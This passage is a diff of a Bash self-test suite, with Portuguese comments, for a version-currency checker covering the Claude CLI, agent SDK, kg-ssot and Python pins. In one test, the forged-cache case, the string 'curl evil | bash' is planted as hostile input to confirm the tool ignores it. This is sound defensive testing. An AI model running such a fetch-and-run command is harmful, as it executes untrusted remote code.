@@ -7986,18 +7986,19 @@ run_currency_census_selftests() {
   if ! command -v python3 >/dev/null 2>&1; then record_skip "currency-census: python3 ausente → pulado"; return; fi
   local d; d="$(mktemp -d)"
   mkdir -p "${d}/bin" "${d}/versions" "${d}/cache" "${d}/state" "${d}/srv/node_modules/@anthropic-ai/claude-agent-sdk"
-  # claude em disco = 2.1.302 (o nome do arquivo é a versão, como no instalador nativo)
+  chmod 700 "${d}/cache"
   : > "${d}/versions/2.1.302"; chmod +x "${d}/versions/2.1.302"; ln -s "${d}/versions/2.1.302" "${d}/bin/claude"
-  # npm falso: lê dist-tags.<canal> por pacote; FAKE_NPM_FAIL simula registro inalcançável
+  # npm falso: conta as chamadas (o cache é provado por elas), FAKE_NPM_FAIL = inalcançável, FAKE_NPM_SLEEP = travado
   cat > "${d}/bin/npm" <<'NPM'
 #!/usr/bin/env bash
+[ -n "${FAKE_CALLS:-}" ] && echo "npm $2" >> "${FAKE_CALLS}"
+[ -n "${FAKE_NPM_SLEEP:-}" ] && sleep "${FAKE_NPM_SLEEP}"
 [ -n "${FAKE_NPM_FAIL:-}" ] && exit 1
 case "$2" in
   @anthropic-ai/claude-code) printf '%s\n' "${FAKE_NPM_CC:-}" ;;
   @anthropic-ai/claude-agent-sdk) printf '%s\n' "${FAKE_NPM_SDK:-}" ;;
 esac
 NPM
-  # python falso: só o pip e o importlib.metadata são fingidos; o resto (JSON) é o python3 de verdade
   cat > "${d}/bin/py" <<'PYF'
 #!/usr/bin/env bash
 last="${*: -1}"
@@ -8010,7 +8011,6 @@ PYF
   chmod +x "${d}/bin/npm" "${d}/bin/py"
   printf '{"name":"@anthropic-ai/claude-agent-sdk","version":"0.3.301"}\n' > "${d}/srv/node_modules/@anthropic-ai/claude-agent-sdk/package.json"
   printf 'bridge\t-\t%s\t-\n' "${d}/srv/node_modules/@anthropic-ai/claude-agent-sdk/package.json" > "${d}/targets.tsv"
-  # repo com origin local, vendor kg-ssot 4.7.2 e o requirements do contrato; o remoto do produto tem tags até 4.10.0
   local g="git -c user.email=t@t -c user.name=t -c init.defaultBranch=main"
   ${g} init -q --bare "${d}/origin.git"; ${g} init -q --bare "${d}/kg.git"
   ${g} clone -q "${d}/origin.git" "${d}/repo" 2>/dev/null
@@ -8018,124 +8018,168 @@ PYF
   printf '{"version":"4.7.2"}\n' > "${d}/repo/vendor/kg-ssot/.kg-ssot-version"
   printf 'PyYAML==6.0.3\njsonschema==4.26.0\n' > "${d}/repo/vendor/kg-ssot/tools/requirements.txt"
   ${g} -C "${d}/repo" add -A; ${g} -C "${d}/repo" commit -q -m base; ${g} -C "${d}/repo" push -q origin main 2>/dev/null
-  ${g} -C "${d}/repo" remote set-head origin main >/dev/null 2>&1
   local t; for t in 4.7.2 4.7.3 4.9.0 4.10.0; do ${g} -C "${d}/repo" tag "kg-ssot-v${t}"; done
   ${g} -C "${d}/repo" push -q "${d}/kg.git" --tags 2>/dev/null
-  # _cc [VAR=val …] -- <args do censo> → stdout (a função NUNCA herda as fontes de produção)
-  _cc() {
+  _cc() {  # [VAR=val …] -- <args do censo> → stdout; nunca herda fonte de produção
     local -a ev=(); while [ "$1" != "--" ]; do ev+=("$1"); shift; done; shift
     env ONION_CC_BIN="${d}/bin/claude" ONION_CC_CHANNEL=latest ONION_CURRENCY_NPM="${d}/bin/npm" \
       ONION_CURRENCY_PY="${d}/bin/py" ONION_CURRENCY_GIT=git ONION_CURRENCY_SDK_TARGETS="${d}/targets.tsv" \
-      ONION_CURRENCY_KG_SSOT_REMOTE="${d}/kg.git" ONION_CURRENCY_CACHE_DIR="${d}/cache" ONION_CURRENCY_TIMEOUT=5 \
+      ONION_CURRENCY_KG_SSOT_REMOTE="${d}/kg.git" ONION_CURRENCY_CACHE_DIR="${d}/cache" ONION_CURRENCY_TIMEOUT=20 \
       FAKE_NPM_CC=2.1.302 FAKE_NPM_SDK=0.3.301 FAKE_PIP_PyYAML=6.0.3 FAKE_PIP_jsonschema=4.26.0 \
-      FAKE_INST_PyYAML=6.0.3 FAKE_INST_jsonschema=4.26.0 ONION_CURRENCY_KG_SSOT_REMOTE="${d}/kg.git" \
-      "${ev[@]}" bash "${sut}" "${d}/repo" "$@" 2>/dev/null
+      FAKE_INST_PyYAML=6.0.3 FAKE_INST_jsonschema=4.26.0 FAKE_CALLS="${d}/calls" \
+      "${ev[@]}" bash "${sut}" "${d}/repo" "$@" 2>/dev/null </dev/null
   }
   _st() { printf '%s\n' "$1" | awk -F'\t' -v s="$2" '$1==s{print $4"|"$2"|"$3; exit}'; }
-  local o r
-  # (a) tudo em dia ⇒ --notice CALA (o caso honesto: aviso que dispara sempre treina a ignorá-lo)
+  _act() { printf '%s\n' "$1" | awk -F'\t' -v s="$2" '$1==s{print $5; exit}'; }
+  _ncalls() { [ -f "${d}/calls" ] && grep -c . "${d}/calls" || echo 0; }
+  local o r n1 n2
+  # (a) tudo em dia ⇒ --notice CALA (o caso honesto)
   printf '{"version":"4.10.0"}\n' > "${d}/repo/vendor/kg-ssot/.kg-ssot-version"
   o="$(_cc -- --fresh --notice)"
   [ -z "${o}" ] && record_pass "currency-census: (a) tudo em dia ⇒ --notice cala" \
     || record_fail "currency-census: (a) tudo em dia" "esperava silêncio, veio: ${o:0:200}"
-  # (a2) e o TSV diz em-dia em cada superfície, com o semver numérico (4.10.0 > 4.9.0)
-  o="$(_cc -- --fresh)"
-  r="$(_st "${o}" kg-ssot)"
-  [ "${r}" = "em-dia|4.10.0|4.10.0" ] && record_pass "currency-census: (a2) kg-ssot 4.10.0 é a maior tag (semver numérico, não lexical)" \
+  r="$(_st "$(_cc -- --fresh)" kg-ssot)"
+  [ "${r}" = "em-dia|4.10.0|4.10.0" ] && record_pass "currency-census: (a2) kg-ssot 4.10.0 é a maior tag (semver numérico)" \
     || record_fail "currency-census: (a2) semver" "esperava em-dia|4.10.0|4.10.0, veio: ${r}"
   printf '{"version":"4.7.2"}\n' > "${d}/repo/vendor/kg-ssot/.kg-ssot-version"
-  # (b) O DEFEITO DO DIA: SDK 0.3.301 servido, npm 0.3.302 ⇒ DEFASADA com as duas versões
+  # (b) O DEFEITO DO DIA: SDK 0.3.301 servido, npm 0.3.302
   o="$(_cc FAKE_NPM_SDK=0.3.302 -- --fresh)"
-  r="$(_st "${o}" agent-sdk:bridge)"
-  [ "${r}" = "defasada|0.3.301|0.3.302" ] && record_pass "currency-census: (b) SDK 0.3.301 servido × npm 0.3.302 ⇒ defasada" \
-    || record_fail "currency-census: (b) SDK defasado" "esperava defasada|0.3.301|0.3.302, veio: ${r}"
+  [ "$(_st "${o}" agent-sdk:bridge)" = "defasada|0.3.301|0.3.302" ] && record_pass "currency-census: (b) SDK 0.3.301 servido × npm 0.3.302 ⇒ defasada" \
+    || record_fail "currency-census: (b) SDK defasado" "veio: $(_st "${o}" agent-sdk:bridge)"
   o="$(_cc FAKE_NPM_SDK=0.3.302 -- --fresh --notice)"
   case "${o}" in *"agent-sdk:bridge: 0.3.301 → 0.3.302 DEFASADA"*) record_pass "currency-census: (b2) o aviso nomeia a superfície e as duas versões" ;;
     *) record_fail "currency-census: (b2) aviso do SDK" "veio: ${o:0:200}" ;; esac
-  # (c) CLI em disco 2.1.302 com o canal em 2.1.303 ⇒ defasada, com a subida
-  o="$(_cc FAKE_NPM_CC=2.1.303 -- --fresh)"
-  r="$(_st "${o}" "claude-cli (canal latest)")"
+  # (c) CLI 2.1.302 × canal 2.1.303 ⇒ defasada; (c2) instalado À FRENTE ⇒ não medido (leitura suspeita), nunca em dia
+  r="$(_st "$(_cc FAKE_NPM_CC=2.1.303 -- --fresh)" "claude-cli (canal latest)")"
   [ "${r}" = "defasada|2.1.302|2.1.303" ] && record_pass "currency-census: (c) CLI 2.1.302 × canal 2.1.303 ⇒ defasada" \
     || record_fail "currency-census: (c) CLI defasado" "veio: ${r}"
-  # (c2) instalado À FRENTE do publicado (registro atrasado) ⇒ em dia, nunca defasada
-  o="$(_cc FAKE_NPM_CC=2.1.299 -- --fresh)"
-  r="$(_st "${o}" "claude-cli (canal latest)")"
-  [ "${r%%|*}" = "em-dia" ] && record_pass "currency-census: (c2) instalado à frente do publicado ⇒ em dia" \
+  r="$(_st "$(_cc FAKE_NPM_CC=2.1.299 -- --fresh)" "claude-cli (canal latest)")"
+  [ "${r%%|*}" = "nao-medida" ] && record_pass "currency-census: (c2) instalado à frente do publicado ⇒ não medido, nunca em dia" \
     || record_fail "currency-census: (c2) à frente" "veio: ${r}"
-  # (d) MODO DE FALHA: registro inalcançável ⇒ NÃO MEDIDO, nunca em dia
+  # (d) registro inalcançável ⇒ NÃO MEDIDO
   o="$(_cc FAKE_NPM_FAIL=1 -- --fresh)"
-  r="$(_st "${o}" "claude-cli (canal latest)")|$(_st "${o}" agent-sdk:bridge)"
-  case "${r}" in nao-medida*"|nao-medida"*) record_pass "currency-census: (d) npm inalcançável ⇒ CLI e SDK NÃO MEDIDOS (nunca em dia)" ;;
-    *) record_fail "currency-census: (d) inalcançável" "veio: ${r}" ;; esac
-  o="$(_cc FAKE_NPM_FAIL=1 -- --fresh --notice)"
-  case "${o}" in *"NÃO MEDIDO"*) record_pass "currency-census: (d2) NÃO MEDIDO aparece no aviso" ;;
-    *) record_fail "currency-census: (d2) aviso do não medido" "veio: ${o:0:200}" ;; esac
-  # (e) FALTOU PACOTE ⇒ AUSENTE com o pedido de autorização (nunca "não medido" por falta de ferramenta)
+  case "$(_st "${o}" "claude-cli (canal latest)")|$(_st "${o}" agent-sdk:bridge)" in nao-medida*"|nao-medida"*) record_pass "currency-census: (d) npm inalcançável ⇒ CLI e SDK NÃO MEDIDOS" ;;
+    *) record_fail "currency-census: (d) inalcançável" "veio: $(_st "${o}" "claude-cli (canal latest)")" ;; esac
+  case "$(_cc FAKE_NPM_FAIL=1 -- --fresh --notice)" in *"NÃO MEDIDO"*) record_pass "currency-census: (d2) NÃO MEDIDO aparece no aviso" ;;
+    *) record_fail "currency-census: (d2) aviso do não medido" "sem NÃO MEDIDO" ;; esac
+  # (e) faltou pacote ⇒ AUSENTE com o pedido de autorização
   o="$(_cc ONION_CURRENCY_NPM="${d}/bin/nao-existe" -- --fresh)"
-  r="$(_st "${o}" "claude-cli (canal latest)")"
-  case "${r}|$(printf '%s' "${o}" | grep -c 'peça autorização ao maestro')" in ausente*"|"[1-9]*) record_pass "currency-census: (e) npm ausente ⇒ AUSENTE e pede autorização ao maestro" ;;
-    *) record_fail "currency-census: (e) ferramenta ausente" "veio: ${r}" ;; esac
-  o="$(_cc FAKE_INST_PyYAML= -- --fresh)"
-  r="$(_st "${o}" python:PyYAML)"
-  case "${r}" in "ausente|-|6.0.3") record_pass "currency-census: (e2) PyYAML não instalado ⇒ AUSENTE com o pino 6.0.3 do contrato" ;;
-    *) record_fail "currency-census: (e2) módulo ausente" "veio: ${r}" ;; esac
-  # (f) kg-ssot 4.7.2 com o produto em 4.10.0 ⇒ defasada; remoto inalcançável ⇒ não medido
-  o="$(_cc -- --fresh)"
-  r="$(_st "${o}" kg-ssot)"
+  case "$(_st "${o}" "claude-cli (canal latest)")|$(_act "${o}" "claude-cli (canal latest)")" in ausente*"peça autorização ao maestro"*) record_pass "currency-census: (e) npm ausente ⇒ AUSENTE e pede autorização ao maestro" ;;
+    *) record_fail "currency-census: (e) ferramenta ausente" "veio: $(_st "${o}" "claude-cli (canal latest)")" ;; esac
+  r="$(_st "$(_cc FAKE_INST_PyYAML= -- --fresh)" python:PyYAML)"
+  [ "${r}" = "ausente|-|6.0.3" ] && record_pass "currency-census: (e2) PyYAML não instalado ⇒ AUSENTE com o pino 6.0.3" \
+    || record_fail "currency-census: (e2) módulo ausente" "veio: ${r}"
+  # (f) kg-ssot 4.7.2 × 4.10.0 ⇒ defasada; remoto inalcançável ⇒ não medido
+  r="$(_st "$(_cc -- --fresh)" kg-ssot)"
   [ "${r}" = "defasada|4.7.2|4.10.0" ] && record_pass "currency-census: (f) vendor kg-ssot 4.7.2 × produto 4.10.0 ⇒ defasada" \
     || record_fail "currency-census: (f) kg-ssot" "veio: ${r}"
-  o="$(_cc ONION_CURRENCY_KG_SSOT_REMOTE="${d}/nao-existe.git" -- --fresh)"
-  r="$(_st "${o}" kg-ssot)"
+  r="$(_st "$(_cc ONION_CURRENCY_KG_SSOT_REMOTE="${d}/nao-existe.git" -- --fresh)" kg-ssot)"
   [ "${r%%|*}" = "nao-medida" ] && record_pass "currency-census: (f2) remoto do produto inalcançável ⇒ não medido" \
     || record_fail "currency-census: (f2) kg remoto" "veio: ${r}"
-  # (g) PyPI à frente do PINO do contrato ⇒ defasada, e a ação manda subir NO PRODUTO, não aqui
+  # (g) PyPI à frente do PINO, instalado = pino ⇒ PINADA, e o aviso CALA sobre ela; (g2) instalado ≠ pino ⇒ defasada (instale o pino)
   o="$(_cc FAKE_PIP_PyYAML=6.0.4 -- --fresh)"
-  case "$(_st "${o}" python:PyYAML)|$(printf '%s' "${o}" | awk -F'\t' '$1=="python:PyYAML"{print $5}')" in
-    "defasada|6.0.3|6.0.4|"*"pino do contrato KG-SSOT é 6.0.3"*) record_pass "currency-census: (g) PyPI 6.0.4 × pino 6.0.3 ⇒ defasada, ação aponta o produto" ;;
-    *) record_fail "currency-census: (g) pino" "veio: $(_st "${o}" python:PyYAML)" ;; esac
-  # (h) base: origin andou e o checkout NÃO buscou ⇒ defasada; depois do fetch ⇒ conta os commits; em dia ⇒ em-dia
+  case "$(_st "${o}" python:PyYAML)|$(_act "${o}" python:PyYAML)" in "pinada|6.0.3|6.0.4|"*"produto kg-ssot"*) record_pass "currency-census: (g) PyPI 6.0.4 × pino 6.0.3 ⇒ pinada (a subida é do produto)" ;;
+    *) record_fail "currency-census: (g) pinada" "veio: $(_st "${o}" python:PyYAML)" ;; esac
+  case "$(_cc FAKE_PIP_PyYAML=6.0.4 -- --fresh --notice)" in *PyYAML*) record_fail "currency-census: (g) pinada no aviso" "a pinada não pode avisar (sem ação neste repo)" ;;
+    *) record_pass "currency-census: (g) pinada não entra no aviso" ;; esac
+  o="$(_cc FAKE_INST_PyYAML=6.0.2 -- --fresh)"
+  case "$(_st "${o}" python:PyYAML)|$(_act "${o}" python:PyYAML)" in "defasada|6.0.2|6.0.3|"*"PyYAML==6.0.3"*) record_pass "currency-census: (g2) instalado 6.0.2 × pino 6.0.3 ⇒ defasada, instale o pino" ;;
+    *) record_fail "currency-census: (g2) fora do pino" "veio: $(_st "${o}" python:PyYAML)" ;; esac
+  # (h) base: em dia; origin andou sem fetch; buscado e não rebaseado; origin inalcançável
   r="$(_st "$(_cc -- --fresh)" base:main)"
   [ "${r%%|*}" = "em-dia" ] && record_pass "currency-census: (h) HEAD = origin/main ⇒ base em dia" \
     || record_fail "currency-census: (h) base em dia" "veio: ${r}"
   ${g} clone -q "${d}/origin.git" "${d}/other" 2>/dev/null
   ${g} -C "${d}/other" commit -q --allow-empty -m novo; ${g} -C "${d}/other" push -q origin main 2>/dev/null
   o="$(_cc -- --fresh)"
-  case "$(_st "${o}" base:main)|$(printf '%s' "${o}" | awk -F'\t' '$1=="base:main"{print $5}')" in
-    defasada*"ainda não buscou"*) record_pass "currency-census: (h2) origin andou sem fetch ⇒ defasada (ls-remote, sem mudar refs)" ;;
+  case "$(_st "${o}" base:main)|$(_act "${o}" base:main)" in defasada*"ainda não buscou"*) record_pass "currency-census: (h2) origin andou sem fetch ⇒ defasada (ls-remote, sem mudar refs)" ;;
     *) record_fail "currency-census: (h2) base não buscada" "veio: $(_st "${o}" base:main)" ;; esac
   git -C "${d}/repo" fetch -q origin 2>/dev/null
   o="$(_cc -- --fresh)"
-  case "$(printf '%s' "${o}" | awk -F'\t' '$1=="base:main"{print $4"|"$5}')" in
-    defasada*"1 commit(s) atrás"*) record_pass "currency-census: (h3) buscado e não rebaseado ⇒ defasada, 1 commit atrás" ;;
+  case "$(_st "${o}" base:main)|$(_act "${o}" base:main)" in defasada*"1 commit(s) atrás"*) record_pass "currency-census: (h3) buscado e não rebaseado ⇒ defasada, 1 commit atrás" ;;
     *) record_fail "currency-census: (h3) base atrás" "veio: $(_st "${o}" base:main)" ;; esac
+  # (j2) a CURA aparece na hora: pull e, SEM --fresh (o origin está em cache), a base já está em dia
+  git -C "${d}/repo" pull -q --ff-only 2>/dev/null
+  r="$(_st "$(_cc -- )" base:main)"
+  [ "${r%%|*}" = "em-dia" ] && record_pass "currency-census: (j2) depois do pull a base está em dia sem --fresh (o lado local nunca vem do cache)" \
+    || record_fail "currency-census: (j2) cura escondida pelo cache" "veio: ${r}"
   git -C "${d}/repo" remote set-url origin "${d}/sumiu.git"
-  r="$(_st "$(_cc -- --fresh)" base:main)"
+  r="$(_st "$(_cc -- --fresh)" base)"
   git -C "${d}/repo" remote set-url origin "${d}/origin.git"
   [ "${r%%|*}" = "nao-medida" ] && record_pass "currency-census: (h4) origin inalcançável ⇒ base não medida" \
     || record_fail "currency-census: (h4) origin inalcançável" "veio: ${r}"
-  # (i) alvo do SDK com conta root ou caminho fora da forma ⇒ recusado (não medido), nunca lido
+  # (h5) branch padrão que não é main, lida pelo symref do origin (não por chute)
+  ${g} init -q --bare "${d}/o2.git"; git -C "${d}/o2.git" symbolic-ref HEAD refs/heads/trunk
+  ${g} clone -q "${d}/o2.git" "${d}/r2" 2>/dev/null; ${g} -C "${d}/r2" checkout -q -b trunk 2>/dev/null
+  ${g} -C "${d}/r2" commit -q --allow-empty -m t; ${g} -C "${d}/r2" push -q origin trunk 2>/dev/null
+  r="$(env ONION_CC_BIN= ONION_CURRENCY_PY= ONION_CURRENCY_SDK_TARGETS= ONION_CURRENCY_CACHE_DIR="${d}/cache" bash "${sut}" "${d}/r2" --fresh 2>/dev/null </dev/null | awk -F'\t' '{print $1"|"$4}')"
+  [ "${r}" = "base:trunk|em-dia" ] && record_pass "currency-census: (h5) branch padrão trunk lida pelo symref ⇒ base:trunk em dia" \
+    || record_fail "currency-census: (h5) branch padrão" "veio: ${r}"
+  # (i) conta root, caminho com .. e symlink ⇒ recusados (não medido), nunca lidos
   printf 'bridge\troot\t%s\t-\n' "${d}/srv/node_modules/@anthropic-ai/claude-agent-sdk/package.json" > "${d}/t-root.tsv"
-  # o caminho com .. aponta para um package.json que EXISTE: sem a recusa, ele seria lido (o caso morde)
   printf 'bridge\t-\t%s/srv/../srv/node_modules/@anthropic-ai/claude-agent-sdk/package.json\t-\n' "${d}" > "${d}/t-dots.tsv"
+  mkdir -p "${d}/lk/node_modules/@anthropic-ai/claude-agent-sdk"; printf '{"version":"7.7.7"}\n' > "${d}/fora.json"
+  ln -s "${d}/fora.json" "${d}/lk/node_modules/@anthropic-ai/claude-agent-sdk/package.json"
+  printf 'bridge\t-\t%s/lk/node_modules/@anthropic-ai/claude-agent-sdk/package.json\t-\n' "${d}" > "${d}/t-link.tsv"
   r="$(_st "$(_cc ONION_CURRENCY_SDK_TARGETS="${d}/t-root.tsv" -- --fresh)" agent-sdk:bridge)|$(_st "$(_cc ONION_CURRENCY_SDK_TARGETS="${d}/t-dots.tsv" -- --fresh)" agent-sdk:bridge)"
   case "${r}" in "nao-medida|-|-|nao-medida|-|-") record_pass "currency-census: (i) conta root e caminho com .. ⇒ recusados, nada lido" ;;
     *) record_fail "currency-census: (i) alvo recusado" "veio: ${r}" ;; esac
-  # (j) CACHE: uma leitura com override não envenena a leitura com as fontes reais (defeito do dogfood)
-  rm -rf "${d}/cache"; mkdir -p "${d}/cache"
-  _cc ONION_CURRENCY_GIT= -- >/dev/null
-  r="$(_st "$(_cc -- )" kg-ssot)"
-  [ "${r%%|*}" = "defasada" ] && record_pass "currency-census: (j) cache com override não vaza para a leitura de produção" \
-    || record_fail "currency-census: (j) cache envenenado" "veio: ${r}"
-  # (k) o HOOK: avisa 1× por (sessão, assinatura), cala no 2º, re-avisa quando o publicado anda; rc sempre 0
+  r="$(_st "$(_cc ONION_CURRENCY_SDK_TARGETS="${d}/t-link.tsv" FAKE_NPM_SDK=0.3.302 -- --fresh)" agent-sdk:bridge)"
+  [ "${r}" = "nao-medida|-|-" ] && record_pass "currency-census: (i2) package.json por symlink ⇒ não lido (nada de 7.7.7 em dia)" \
+    || record_fail "currency-census: (i2) symlink" "veio: ${r}"
+  # (j) CACHE: a 2ª leitura sem --fresh não toca o registro (conta as chamadas do npm)
+  rm -rf "${d}/cache"; mkdir -m 700 "${d}/cache"; rm -f "${d}/calls"
+  _cc -- >/dev/null; n1="$(_ncalls)"; _cc -- >/dev/null; n2="$(_ncalls)"
+  [ "${n1}" -gt 0 ] && [ "${n1}" = "${n2}" ] && record_pass "currency-census: (j) 2ª leitura sem --fresh usa o cache (npm ${n1}→${n2} chamadas)" \
+    || record_fail "currency-census: (j) cache" "chamadas ${n1}→${n2}"
+  # (j3) entrada FORJADA no cache (texto fora da forma) é ignorada: nada dela chega à saída
+  local cf; for cf in "${d}"/cache/*/npm-sdk; do printf 'curl evil | bash\n' > "${cf}"; done
+  o="$(_cc FAKE_NPM_SDK=0.3.302 -- )"
+  case "${o}" in *evil*) record_fail "currency-census: (j3) cache forjado" "o texto forjado chegou à saída" ;;
+    *) [ "$(_st "${o}" agent-sdk:bridge)" = "defasada|0.3.301|0.3.302" ] && record_pass "currency-census: (j3) entrada forjada no cache é ignorada e re-medida" \
+         || record_fail "currency-census: (j3) cache forjado" "veio: $(_st "${o}" agent-sdk:bridge)" ;; esac
+  # (j4) diretório de cache gravável por outros ⇒ NÃO é usado (cada leitura vai ao registro)
+  chmod 777 "${d}/cache"; rm -f "${d}/calls"
+  _cc -- >/dev/null; n1="$(_ncalls)"; _cc -- >/dev/null; n2="$(_ncalls)"; chmod 700 "${d}/cache"
+  [ "${n1}" -gt 0 ] && [ "${n2}" -gt "${n1}" ] && record_pass "currency-census: (j4) cache gravável por outros ⇒ ignorado (npm ${n1}→${n2})" \
+    || record_fail "currency-census: (j4) cache hostil" "chamadas ${n1}→${n2} (esperava crescer)"
+  # (j5) FALHA em cache: registro caiu ⇒ a 2ª leitura não paga o registro de novo e segue não medido
+  rm -rf "${d}/cache"; mkdir -m 700 "${d}/cache"; rm -f "${d}/calls"
+  _cc FAKE_NPM_FAIL=1 -- >/dev/null; n1="$(_ncalls)"; o="$(_cc FAKE_NPM_FAIL=1 -- )"; n2="$(_ncalls)"
+  [ "${n1}" -gt 0 ] && [ "${n1}" = "${n2}" ] && [ "$(_st "${o}" agent-sdk:bridge | cut -d'|' -f1)" = "nao-medida" ] \
+    && record_pass "currency-census: (j5) falha do registro fica em cache e segue NÃO MEDIDA" \
+    || record_fail "currency-census: (j5) falha em cache" "chamadas ${n1}→${n2}, sdk $(_st "${o}" agent-sdk:bridge)"
+  rm -rf "${d}/cache"; mkdir -m 700 "${d}/cache"
+  # (l) HOME indefinido não mata a perna do CLI
+  r="$(env -u HOME ONION_CC_BIN="${d}/bin/claude" ONION_CURRENCY_NPM="${d}/bin/npm" FAKE_NPM_CC=2.1.302 ONION_CURRENCY_PY="${d}/bin/py" \
+    ONION_CURRENCY_SDK_TARGETS= ONION_CURRENCY_GIT= ONION_CURRENCY_CACHE_DIR="${d}/cache" bash "${sut}" "${d}/repo" --fresh 2>/dev/null </dev/null | awk -F'\t' '$1 ~ /^claude-cli/{print $4}')"
+  [ "${r}" = "em-dia" ] && record_pass "currency-census: (l) HOME indefinido ⇒ a linha do CLI continua lá" \
+    || record_fail "currency-census: (l) HOME indefinido" "veio: '${r}'"
+  # (m) falta o `timeout` ⇒ AUSENTE (pede coreutils), nunca "inalcançável"
+  mkdir -p "${d}/nobin"; local tl
+  for tl in stat cksum sort sed awk head tail readlink mktemp grep cat id date dirname env bash; do ln -sf "$(command -v "${tl}")" "${d}/nobin/${tl}"; done
+  o="$(env PATH="${d}/nobin" bash "${sut}" "${d}/repo" --fresh 2>/dev/null </dev/null)"
+  case "$(_st "${o}" ferramentas)|$(_act "${o}" ferramentas)" in ausente*timeout*"peça autorização"*) record_pass "currency-census: (m) sem timeout ⇒ AUSENTE nomeando o timeout" ;;
+    *) record_fail "currency-census: (m) ferramenta da medição" "veio: ${o:0:200}" ;; esac
+  # (n) PRAZO: registro travado ⇒ a perna estoura e vira não medida, sem passar do prazo
+  local s0 s1; s0="$(date +%s)"
+  o="$(_cc FAKE_NPM_SLEEP=30 ONION_CURRENCY_DEADLINE=2 ONION_CURRENCY_TIMEOUT=20 -- --fresh)"; s1="$(date +%s)"
+  case "$(_st "${o}" perna:cli)|$(_act "${o}" perna:cli)" in nao-medida*"estourou o prazo"*) [ $((s1 - s0)) -le 8 ] && record_pass "currency-census: (n) registro travado ⇒ perna estourada NÃO MEDIDA em $((s1 - s0)) s" \
+      || record_fail "currency-census: (n) prazo" "levou $((s1 - s0)) s" ;;
+    *) record_fail "currency-census: (n) prazo" "veio: ${o:0:200}" ;; esac
+  # (o) perna que MORRE vira linha não medida (nunca some calada)
+  o="$(_cc ONION_CURRENCY_DEADLINE=abc -- --fresh)"
+  case "$(_st "${o}" perna:sdk)|$(_act "${o}" perna:sdk)" in nao-medida*"morreu"*) record_pass "currency-census: (o) perna morta ⇒ linha NÃO MEDIDA declarando a morte" ;;
+    *) record_fail "currency-census: (o) perna morta" "veio: ${o:0:200}" ;; esac
+  # (k) o HOOK: por superfície, 1× por sessão e assinatura; volta-a-em-dia limpa; rc sempre 0
   _hk() {
     local rc=0 out
     out="$(env ONION_CURRENCY_CENSUS="${d}/census-wrap.sh" ONION_CURRENCY_STATE_DIR="${d}/state" \
       CLAUDE_PROJECT_DIR="${d}/repo" CLAUDE_CODE_SESSION_ID=bench "$@" bash "${hk}" </dev/null 2>/dev/null)" || rc=$?
     printf '%s|%s' "${rc}" "${out}"
   }
-  printf '#!/usr/bin/env bash\nexec env ONION_CC_BIN=%q ONION_CC_CHANNEL=latest ONION_CURRENCY_NPM=%q ONION_CURRENCY_PY=%q ONION_CURRENCY_SDK_TARGETS=%q ONION_CURRENCY_KG_SSOT_REMOTE=%q ONION_CURRENCY_CACHE_DIR=%q FAKE_INST_PyYAML=6.0.3 FAKE_INST_jsonschema=4.26.0 FAKE_PIP_PyYAML=6.0.3 FAKE_PIP_jsonschema=4.26.0 FAKE_NPM_CC=2.1.302 bash %q "$@" --fresh\n' \
+  printf '#!/usr/bin/env bash\nexec env ONION_CC_BIN=%q ONION_CC_CHANNEL=latest ONION_CURRENCY_NPM=%q ONION_CURRENCY_PY=%q ONION_CURRENCY_SDK_TARGETS=%q ONION_CURRENCY_KG_SSOT_REMOTE=%q ONION_CURRENCY_CACHE_DIR=%q ONION_CURRENCY_TIMEOUT=20 ONION_CURRENCY_DEADLINE=40 FAKE_INST_PyYAML=6.0.3 FAKE_INST_jsonschema=4.26.0 FAKE_PIP_PyYAML=6.0.3 FAKE_PIP_jsonschema=4.26.0 FAKE_NPM_CC=2.1.302 bash %q "$@" --fresh\n' \
     "${d}/bin/claude" "${d}/bin/npm" "${d}/bin/py" "${d}/targets.tsv" "${d}/kg.git" "${d}/cache" "${sut}" > "${d}/census-wrap.sh"
-  git -C "${d}/repo" pull -q --ff-only 2>/dev/null
   printf '{"version":"4.10.0"}\n' > "${d}/repo/vendor/kg-ssot/.kg-ssot-version"
   r="$(_hk FAKE_NPM_SDK=0.3.301)"
   [ "${r}" = "0|" ] && record_pass "currency-census: (k) hook com tudo em dia ⇒ silêncio, rc=0" \
@@ -8144,11 +8188,23 @@ PYF
   case "${r}" in "0|"*"0.3.301 → 0.3.302 DEFASADA"*) record_pass "currency-census: (k2) hook avisa o SDK defasado, rc=0 (nunca bloqueia)" ;;
     *) record_fail "currency-census: (k2) hook avisa" "veio: ${r:0:200}" ;; esac
   r="$(_hk FAKE_NPM_SDK=0.3.302)"
-  [ "${r}" = "0|" ] && record_pass "currency-census: (k3) 2ª vez na mesma (sessão, assinatura) ⇒ cala" \
-    || record_fail "currency-census: (k3) rate-limit" "veio: ${r:0:200}"
+  [ "${r}" = "0|" ] && record_pass "currency-census: (k3) 2ª vez na mesma (sessão, superfície, assinatura) ⇒ cala" \
+    || record_fail "currency-census: (k3) rate-limit" "veio (inteiro, para diagnóstico de intermitência): ${r}"
   r="$(_hk FAKE_NPM_SDK=0.3.303)"
   case "${r}" in "0|"*"0.3.303"*) record_pass "currency-census: (k4) o publicado andou (0.3.303) ⇒ avisa de novo" ;;
     *) record_fail "currency-census: (k4) re-aviso" "veio: ${r:0:200}" ;; esac
+  # (k5) base: atrás avisa; a main anda de novo com a base ainda atrás ⇒ CALA (sem ruído por sha);
+  #      pull (em dia) limpa; a main anda ⇒ avisa DE NOVO (o vai-e-volta não fica mudo)
+  ${g} -C "${d}/other" pull -q 2>/dev/null; ${g} -C "${d}/other" commit -q --allow-empty -m b1; ${g} -C "${d}/other" push -q origin main 2>/dev/null
+  r="$(_hk FAKE_NPM_SDK=0.3.303)"
+  case "${r}" in "0|"*"base:main"*DEFASADA*) ;; *) record_fail "currency-census: (k5) base atrás" "esperava aviso da base, veio: ${r:0:200}" ;; esac
+  ${g} -C "${d}/other" commit -q --allow-empty -m b2; ${g} -C "${d}/other" push -q origin main 2>/dev/null
+  local r2; r2="$(_hk FAKE_NPM_SDK=0.3.303)"
+  git -C "${d}/repo" pull -q --ff-only 2>/dev/null; _hk FAKE_NPM_SDK=0.3.303 >/dev/null
+  ${g} -C "${d}/other" commit -q --allow-empty -m b3; ${g} -C "${d}/other" push -q origin main 2>/dev/null
+  local r3; r3="$(_hk FAKE_NPM_SDK=0.3.303)"
+  case "${r}|${r2}|${r3}" in "0|"*"base:main"*"|0||0|"*"base:main"*DEFASADA*) record_pass "currency-census: (k5) base: avisa, cala no sha novo, limpa no pull, re-avisa quando cai de novo" ;;
